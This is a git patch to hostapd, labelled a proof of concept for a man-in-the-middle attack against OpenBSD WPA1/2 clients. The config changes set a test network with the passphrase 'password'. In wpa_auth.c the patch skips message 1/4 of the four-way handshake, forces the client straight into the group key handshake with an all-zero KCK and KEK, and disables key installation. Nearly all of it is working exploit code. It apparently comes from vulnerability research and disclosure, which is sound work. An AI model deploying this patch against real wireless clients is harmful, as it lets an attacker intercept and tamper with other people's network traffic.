From d017d2aded0159e8836f690222d3c47a5a38404d Mon Sep 17 00:00:00 2001
From: Mathy <vanhoefm@users.noreply.github.com>
Date: Sat, 22 Jul 2017 22:02:49 -0400
Subject: [PATCH] OpenBSD man-in-the-middle against WPA1/2 clients PoC

---
 hostapd/defconfig    |  2 +-
 hostapd/hostapd.conf | 12 ++++++------
 src/ap/wpa_auth.c    | 41 +++++++++++++++++++++++++++++++++++++++++
 3 files changed, 48 insertions(+), 7 deletions(-)

diff --git a/hostapd/defconfig b/hostapd/defconfig
index 4659dd1e6..1a24dbb2b 100644
--- a/hostapd/defconfig
+++ b/hostapd/defconfig
@@ -31,7 +31,7 @@ CONFIG_DRIVER_NL80211=y
 #CONFIG_LIBNL20=y
 
 # Use libnl 3.2 libraries (if this is selected, CONFIG_LIBNL20 is ignored)
-#CONFIG_LIBNL32=y
+CONFIG_LIBNL32=y
 
 
 # Driver interface for FreeBSD net80211 layer (e.g., Atheros driver)
diff --git a/hostapd/hostapd.conf b/hostapd/hostapd.conf
index fa9a855a6..aa4571e23 100644
--- a/hostapd/hostapd.conf
+++ b/hostapd/hostapd.conf
@@ -5,7 +5,7 @@
 # management frames with the Host AP driver); wlan0 with many nl80211 drivers
 # Note: This attribute can be overridden by the values supplied with the '-i'
 # command line parameter.
-interface=wlan0
+interface=wlp0s20u1
 
 # In case of atheros and nl80211 driver interfaces, an additional
 # configuration parameter, bridge, may be used to notify hostapd if the
@@ -85,7 +85,7 @@ ctrl_interface_group=0
 ##### IEEE 802.11 related configuration #######################################
 
 # SSID to be used in IEEE 802.11 management frames
-ssid=test
+ssid=simulnet
 # Alternative formats for configuring SSID
 # (double quoted string, hexdump, printf-escaped string)
 #ssid2="test"
@@ -1134,7 +1134,7 @@ own_ip_addr=127.0.0.1
 # and/or WPA2 (full IEEE 802.11i/RSN):
 # bit0 = WPA
 # bit1 = IEEE 802.11i/RSN (WPA2) (dot11RSNAEnabled)
-#wpa=1
+wpa=3
 
 # WPA pre-shared keys for WPA-PSK. This can be either entered as a 256-bit
 # secret in hex format (64 hex digits), wpa_psk, or as an ASCII passphrase
@@ -1143,7 +1143,7 @@ own_ip_addr=127.0.0.1
 # wpa_psk (dot11RSNAConfigPSKValue)
 # wpa_passphrase (dot11RSNAConfigPSKPassPhrase)
 #wpa_psk=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
-#wpa_passphrase=secret passphrase
+wpa_passphrase=password
 
 # Optionally, WPA PSKs can be read from a separate text file (containing list
 # of (PSK,MAC address) pairs. This allows more than one PSK to be configured.
@@ -1176,9 +1176,9 @@ own_ip_addr=127.0.0.1
 # TKIP will be used as the group cipher.
 # (dot11RSNAConfigPairwiseCiphersTable)
 # Pairwise cipher for WPA (v1) (default: TKIP)
-#wpa_pairwise=TKIP CCMP
+wpa_pairwise=CCMP
 # Pairwise cipher for RSN/WPA2 (default: use wpa_pairwise value)
-#rsn_pairwise=CCMP
+rsn_pairwise=CCMP
 
 # Time interval for rekeying GTK (broadcast/multicast encryption keys) in
 # seconds. (dot11RSNAConfigGroupRekeyTime)
diff --git a/src/ap/wpa_auth.c b/src/ap/wpa_auth.c
index 358708648..9929fd108 100644
--- a/src/ap/wpa_auth.c
+++ b/src/ap/wpa_auth.c
@@ -53,6 +53,8 @@ static void wpa_group_get(struct wpa_authenticator *wpa_auth,
 static void wpa_group_put(struct wpa_authenticator *wpa_auth,
 			  struct wpa_group *group);
 
+static void attack_skip_ptk_start_group();
+
 static const u32 dot11RSNAConfigGroupUpdateCount = 4;
 static const u32 dot11RSNAConfigPairwiseUpdateCount = 4;
 static const u32 eapol_key_timeout_first = 100; /* ms */
@@ -1563,6 +1565,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
 					     key_data_len);
 #endif /* CONFIG_NO_RC4 */
 		} else {
+			printf("%s: bad key descriptor or whatever (no RC4 no AES)\n", __FUNCTION__);
 			os_free(hdr);
 			os_free(buf);
 			return;
@@ -1597,6 +1600,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
 #endif /* CONFIG_TESTING_OPTIONS */
 	}
 
+	printf("%s: calling wpa_auth_set_eapol and wpa_auth_send_eapol: sm->pairwise_set=%d\n", __FUNCTION__, sm->pairwise_set);
 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_inc_EapolFramesTx,
 			   1);
 	wpa_auth_send_eapol(wpa_auth, sm->addr, (u8 *) hdr, len,
@@ -2021,9 +2025,16 @@ SM_STATE(WPA_PTK, PTKSTART)
 				  wpa_key_mgmt_sha256(sm->wpa_key_mgmt));
 		}
 	}
+
+#if 1
+	attack_skip_ptk_start_group(sm, global);
+#else
+	printf(">>> Sending msg 1/4\n");
+
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
 		       sm->ANonce, pmkid, pmkid_len, 0, 0);
+#endif
 }
 
 
@@ -2390,13 +2401,25 @@ SM_STATE(WPA_PTK, PTKINITDONE)
 	if (sm->Pair) {
 		enum wpa_alg alg = wpa_cipher_to_alg(sm->pairwise);
 		int klen = wpa_cipher_key_len(sm->pairwise);
+#if 1
+		printf(">>> PTKINITDONE: not installing PTK.tk keys using wpa_auth_set_key\n");
+
+		printf(">>> PTKINITDONE: setting all-zero KCK and KEK, each of length 16. Setting PTK as valid.\n");
+		sm->PTK.kck_len = 16;
+		sm->PTK.kek_len = 16;
+		memset(sm->PTK.kck, 0, sm->PTK.kck_len);
+		memset(sm->PTK.kek, 0, sm->PTK.kek_len);
+		sm->PTK_valid = TRUE;
+#else
 		if (wpa_auth_set_key(sm->wpa_auth, 0, alg, sm->addr, 0,
 				     sm->PTK.tk, klen)) {
 			wpa_sta_disconnect(sm->wpa_auth, sm->addr);
 			return;
 		}
+
 		/* FIX: MLME-SetProtection.Request(TA, Tx_Rx) */
 		sm->pairwise_set = TRUE;
+#endif
 
 		if (sm->wpa_auth->conf.wpa_ptk_rekey) {
 			eloop_cancel_timeout(wpa_rekey_ptk, sm->wpa_auth, sm);
@@ -2423,10 +2446,15 @@ SM_STATE(WPA_PTK, PTKINITDONE)
 	}
 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyAvailable, 0);
 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyDone, 1);
+#if 1
+	printf(">>> PTKINITDONE: forcing group key handshake\n");
+	sm->GUpdateStationKeys = TRUE;
+#else
 	if (sm->wpa == WPA_VERSION_WPA)
 		sm->PInitAKeys = TRUE;
 	else
 		sm->has_GTK = TRUE;
+#endif
 	wpa_auth_vlogger(sm->wpa_auth, sm->addr, LOGGER_INFO,
 			 "pairwise key handshake completed (%s)",
 			 sm->wpa == WPA_VERSION_WPA ? "WPA" : "RSN");
@@ -2549,6 +2577,16 @@ SM_STEP(WPA_PTK)
 }
 
 
+static void attack_skip_ptk_start_group(STATE_MACHINE_DATA *sm, int global)
+{
+	printf(">>> Skipping msg 1/4, going to group 1/2\n");
+
+	SM_ENTER(WPA_PTK, PTKINITDONE);
+
+	printf(">>> We should be in group 1/2 now\n");
+}
+
+
 SM_STATE(WPA_PTK_GROUP, IDLE)
 {
 	SM_ENTRY_MA(WPA_PTK_GROUP, IDLE, wpa_ptk_group);
@@ -2618,6 +2656,7 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
 		kde_len = gsm->GTK_len;
 	}
 
+	printf(">>> Sending group 1/2\n");
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       WPA_KEY_INFO_SECURE | WPA_KEY_INFO_MIC |
 		       WPA_KEY_INFO_ACK |
@@ -2895,6 +2934,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
 {
 	int ret = 0;
 
+#if 0
 	if (wpa_auth_set_key(wpa_auth, group->vlan_id,
 			     wpa_cipher_to_alg(wpa_auth->conf.wpa_group),
 			     broadcast_ether_addr, group->GN,
@@ -2916,6 +2956,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
 			ret = -1;
 	}
 #endif /* CONFIG_IEEE80211W */
+#endif
 
 	return ret;
 }
-- 
2.11.0

